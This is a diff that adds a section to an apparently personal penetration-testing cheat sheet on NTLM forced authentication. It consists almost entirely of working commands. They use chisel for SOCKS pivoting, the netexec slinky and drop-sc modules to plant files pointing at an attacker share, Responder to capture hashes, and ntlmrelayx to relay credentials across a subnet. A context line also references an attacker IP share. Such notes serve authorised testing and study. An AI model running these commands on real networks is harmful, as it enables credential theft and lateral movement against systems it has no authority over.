@@ -215,6 +215,28 @@ IconFile=\\$ATTACKER_IP\share\blahblah
 Command=ToggleDesktop
 ```
 
+- NTLM forced authentication using netexec
+
+```shell
+# In case of pivoting we need to connect our device as client as to target machine
+sudo chisel client 10.129.204.133:8080 socks
+
+# Using slinky
+proxychains -q netexec smb $TARGET_IP $USER -p $PASSWORD -M slinky -o SERVER=$OUR_IP NAME=important
+proxychains -q netexec smb $TARGET_IP $USER -p $PASSWORD -M slinky -o NAME=important CLEANUP=YES
+
+# Using drop-sc
+proxychains -q netexec smb $TARGET_IP $USER -p $PASSWORD -M drop-sc -o URL=\\\\$OUR_IP\\secret SHARE=IT-Tools FILENAME=secret
+proxychains -q netexec smb $TARGET_IP $USER -p $PASSWORD -M drop-sc -o CLEANUP=True FILENAME=secret
+
+# Start responder
+sudo responder -I tun0
+
+# We can also generate relay list ans use NTLM relayx
+proxychains4 -q netexec smb 172.16.1.0/24 --gen-relay-list relay.txt
+sudo proxychains -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
+```
+
 - Other exploits using netexec
 
 ```shell
